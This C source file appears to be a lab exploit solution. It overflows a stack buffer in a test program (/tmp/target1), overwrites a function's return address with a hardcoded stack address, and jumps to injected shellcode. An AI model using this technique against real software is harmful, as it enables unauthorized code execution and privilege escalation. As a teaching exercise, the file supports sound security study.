#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target1"
#define DEFAULT_OUTPUT "/tmp/xploit1_output"


// Length of the exploit file
#define XPLOIT_LEN 1024

// Address of the buffer we are planning to overflow (found by running modified target multiple times)
#define BUFFER_ADDRESS 0x00007fffffffe8a0

// Distance between buffer address and dangerous "foo" function return address (in stack)
#define RETURN_OFFSET (128 + sizeof(void*))


int main(int argc, char *argv[]) {
  // Exploit file buffer
  char exploit[XPLOIT_LEN];

  // Fill exploit buffer with any non-zero bytes
  memset(exploit, 0xff, XPLOIT_LEN);

  // Overwrite the "foo" function return with buffer address, so that we jump to the beginning of the buffer
  void* address = (void*) BUFFER_ADDRESS;
  memcpy(&exploit[RETURN_OFFSET], &address, sizeof(void*));

  // Put shell code to the very beginning of the buffer (excluding the termination 0 byte)
  memcpy(exploit, shellcode, sizeof(shellcode) - 1);

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed.");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
